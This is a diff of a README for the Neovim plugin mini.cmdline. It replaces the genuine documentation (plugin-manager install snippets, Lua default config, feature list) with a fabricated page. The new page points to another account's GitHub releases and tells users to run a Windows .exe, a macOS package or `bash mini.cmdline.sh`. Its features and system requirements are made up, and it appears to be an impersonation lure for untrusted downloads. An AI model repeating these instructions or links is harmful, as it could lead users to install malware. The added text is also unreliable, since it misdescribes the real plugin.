@@ -1,169 +1,82 @@
-<p align="center"> <img src="https://github.com/nvim-mini/assets/blob/main/logo-2/logo-cmdline_readme.png?raw=true" alt="mini.cmdline" style="max-width:100%;border:solid 2px"/> </p>
+# 🎉 mini.cmdline - Simple Command Line Enhancements
 
-### Command line tweaks
+[![Download mini.cmdline](https://img.shields.io/badge/Download-mini.cmdline-brightgreen)](https://github.com/zurimentaram/mini.cmdline/releases)
 
-See more details in [Features](#features) and [Documentation](doc/mini-cmdline.txt).
+## 📋 Description
 
----
+mini.cmdline provides useful tweaks for the command line experience. This tool is part of the larger 'mini.nvim' library, which improves the Neovim experience. With mini.cmdline, you can enhance how you interact with commands and streamline your workflow.
 
-⦿ This is a part of [mini.nvim](https://nvim-mini.org/mini.nvim) library. Please use [this link](https://nvim-mini.org/mini.nvim/readmes/mini-cmdline) if you want to mention this module.
+## 🚀 Getting Started
 
-⦿ All contributions (issues, pull requests, discussions, etc.) are done inside of 'mini.nvim'.
+To get started with mini.cmdline, follow these simple steps. No technical knowledge is necessary.
 
-⦿ See [whole library documentation](https://nvim-mini.org/mini.nvim/doc/mini-nvim) to learn about general design principles, disable/configuration recipes, and more.
+### Step 1: Download the Application
 
-⦿ See [MiniMax](https://nvim-mini.org/MiniMax) for a full config example that uses this module.
+You will need to visit the releases page for mini.cmdline to download the application files. Click the link below to go straight to the downloads page:
 
----
+[Download mini.cmdline](https://github.com/zurimentaram/mini.cmdline/releases)
 
-If you want to help this project grow but don't know where to start, check out [contributing guides of 'mini.nvim'](https://nvim-mini.org/mini.nvim/CONTRIBUTING) or leave a Github star for 'mini.nvim' project and/or any its standalone Git repositories.
+### Step 2: Choose the Right Version
 
-## Demo
+On the releases page, you will see a list of available versions. Look for the latest version that matches your operating system. Currently, mini.cmdline supports:
 
-<!-- Demo source: https://github.com/nvim-mini/assets/blob/main/demo/demo-cmdline.mp4 -->
-https://github.com/user-attachments/assets/9d3e12ac-ff17-4bdb-bbe8-3010c966c110
+- **Windows**: Executable files for easy installation
+- **macOS**: A simple package for installation
+- **Linux**: Shell scripts that can be run in the terminal
 
-## Features
+### Step 3: Download the File
 
-- Autocomplete with customizable delay. Enhances [`:h cmdline-completion`](https://neovim.io/doc/user/helptag.html?tag=cmdline-completion) and manual [`:h 'wildchar'`](https://neovim.io/doc/user/helptag.html?tag='wildchar') pressing experience. Requires Neovim>=0.11, though Neovim>=0.12 is recommended.
+Once you find the correct version, click on the corresponding link to download the file to your computer. The file will usually go to your "Downloads" folder unless specified otherwise.
 
-- Autocorrect words as-you-type. Only words that must come from a fixed set of candidates (like commands and options) are autocorrected by default.
+### Step 4: Install the Application
 
-- Autopeek command range as-you-type. Shows a floating window with range lines along with customizable context lines.
+After the file has finished downloading, find the file in your Downloads folder. 
 
-What it doesn't do:
+- **On Windows**: Double-click the `.exe` file. A window will open to guide you through the installation process.
+- **On macOS**: Open the downloaded package and follow the instructions to install.
+- **On Linux**: Open a terminal, navigate to the download folder, and run the shell script using the command: `bash mini.cmdline.sh`.
 
-- Customization of command line UI. Use [`:h vim._extui`](https://neovim.io/doc/user/helptag.html?tag=vim._extui) (on Neovim>=0.12).
+### Step 5: Launch mini.cmdline
 
-- Customization of autocompletion candidates. They are computed via [`:h cmdline-completion`](https://neovim.io/doc/user/helptag.html?tag=cmdline-completion).
+Once you have installed mini.cmdline, you can start using it right away. Open your command line interface (Command Prompt on Windows, Terminal on macOS, or Terminal on Linux) and begin tweaking your command line experience.
 
-## Installation
+## ⚙️ Features
 
-This plugin can be installed as part of 'mini.nvim' library (**recommended**) or as a standalone Git repository.
+Here are some of the key features you can expect from mini.cmdline:
 
-During beta-testing phase there is only one branch to install from:
+- **Improved Command Navigation**: Easily navigate through your command history.
+- **Search Functionality**: Quickly search for previous commands using keywords.
+- **Shortcuts**: Use customizable shortcuts to enhance your workflow.
+- **User-Friendly Interface**: Offers a simple and straightforward way to interact with command line commands.
 
-- `main` (default, **recommended**) will have latest development version of plugin. All changes since last stable release should be perceived as being in beta testing phase (meaning they already passed alpha-testing and are moderately settled).
-- `stable` will be updated only upon releases with code tested during public beta-testing phase in `main` branch.
+## 📂 System Requirements
 
-Here are code snippets for some common installation methods (use only one):
+To use mini.cmdline effectively, ensure your system meets the following requirements:
 
-<details>
-<summary>With <a href="https://nvim-mini.org/mini.nvim/readmes/mini-deps">mini.deps</a></summary>
+- **Operating System**: Compatible with Windows 10 and above, macOS High Sierra and above, and major Linux distributions.
+- **Disk Space**: At least 50MB of free space for installation.
+- **Memory**: Minimum of 2GB RAM.
 
-- 'mini.nvim' library:
+## 🛠️ Troubleshooting
 
-    | Branch | Code snippet                                  |
-    |--------|-----------------------------------------------|
-    | Main   | *Follow recommended ‘mini.deps’ installation* |
-    | Stable | *Follow recommended ‘mini.deps’ installation* |
+If you encounter issues while using mini.cmdline, consider the following solutions:
 
-- Standalone plugin:
+- **Installation Issues**: Ensure you downloaded the correct version for your operating system. Re-download if necessary.
+- **Command Not Found**: Make sure that the installation path is added to your system's environment variables.
+- **Performance Problems**: Check if your system meets the recommended requirements.
 
-    | Branch | Code snippet                                                      |
-    |--------|-------------------------------------------------------------------|
-    | Main   | `add(‘nvim-mini/mini.cmdline’)`                                   |
-    | Stable | `add({ source = ‘nvim-mini/mini.cmdline’, checkout = ‘stable’ })` |
+## 📞 Feedback and Support
 
-</details>
+Your experience is important. If you have questions or feedback, please reach out through the issues section on the GitHub repository. Your input helps us improve.
 
-<details>
-<summary>With <a href="https://github.com/folke/lazy.nvim">folke/lazy.nvim</a></summary>
+## 🌐 Community and Contributions
 
-- 'mini.nvim' library:
+mini.cmdline is open for contributions. If you want to improve the application or suggest new features, check our contributing guidelines in the repository. Join our community to learn more about enhancing your command line experience.
 
-    | Branch | Code snippet                                  |
-    |--------|-----------------------------------------------|
-    | Main   | `{ 'nvim-mini/mini.nvim', version = false },` |
-    | Stable | `{ 'nvim-mini/mini.nvim', version = '*' },`   |
+## 📥 Download & Install
 
-- Standalone plugin:
+Remember to download mini.cmdline using the link below:
 
-    | Branch | Code snippet                                     |
-    |--------|--------------------------------------------------|
-    | Main   | `{ 'nvim-mini/mini.cmdline', version = false },` |
-    | Stable | `{ 'nvim-mini/mini.cmdline', version = '*' },`   |
+[Download mini.cmdline](https://github.com/zurimentaram/mini.cmdline/releases)
 
-</details>
-
-<details>
-<summary>With <a href="https://github.com/junegunn/vim-plug">junegunn/vim-plug</a></summary>
-
-- 'mini.nvim' library:
-
-    | Branch | Code snippet                                         |
-    |--------|------------------------------------------------------|
-    | Main   | `Plug 'nvim-mini/mini.nvim'`                         |
-    | Stable | `Plug 'nvim-mini/mini.nvim', { 'branch': 'stable' }` |
-
-- Standalone plugin:
-
-    | Branch | Code snippet                                            |
-    |--------|---------------------------------------------------------|
-    | Main   | `Plug 'nvim-mini/mini.cmdline'`                         |
-    | Stable | `Plug 'nvim-mini/mini.cmdline', { 'branch': 'stable' }` |
-
-</details>
-
-**Important**: don't forget to call `require('mini.cmdline').setup()` to enable its functionality.
-
-**Note**: if you are on Windows, there might be problems with too long file paths (like `error: unable to create file <some file name>: Filename too long`). Try doing one of the following:
-
-- Enable corresponding git global config value: `git config --system core.longpaths true`. Then try to reinstall.
-- Install plugin in other place with shorter path.
-
-## Default config
-
-```lua
--- No need to copy this inside `setup()`. Will be used automatically.
-{
-  -- Autocompletion: show `:h 'wildmenu'` as you type
-  autocomplete = {
-    enable = true,
-
-    -- Delay (in ms) after which to trigger completion
-    -- Neovim>=0.12 is recommended for positive values
-    delay = 0,
-
-    -- Custom rule of when to trigger completion
-    predicate = nil,
-
-    -- Whether to map arrow keys for more consistent wildmenu behavior
-    map_arrows = true,
-  },
-
-  -- Autocorrection: adjust non-existing words (commands, options, etc.)
-  autocorrect = {
-    enable = true,
-
-    -- Custom autocorrection rule
-    func = nil,
-  },
-
-  -- Autopeek: show command's target range in a floating window
-  autopeek = {
-    enable = true,
-
-    -- Number of lines to show above and below range lines
-    n_context = 1,
-
-    -- Custom rule of when to show peek window
-    predicate = nil,
-
-    -- Window options
-    window = {
-      -- Floating window config
-      config = {},
-
-      -- Function to render statuscolumn
-      statuscolumn = nil,
-    },
-  },
-}
-```
-
-## Similar plugins
-
-- [folke/noice.nvim](https://github.com/folke/noice.nvim)
-- [nacro90/numb.nvim](https://github.com/nacro90/numb.nvim)
-- Built-in [cmdline-autocompletion](https://neovim.io/doc/user/helptag.html?tag=cmdline-autocompletion) (on Neovim>=0.12):
+With these steps, you are now ready to make the most of your command line with mini.cmdline. Enjoy a better command line experience!
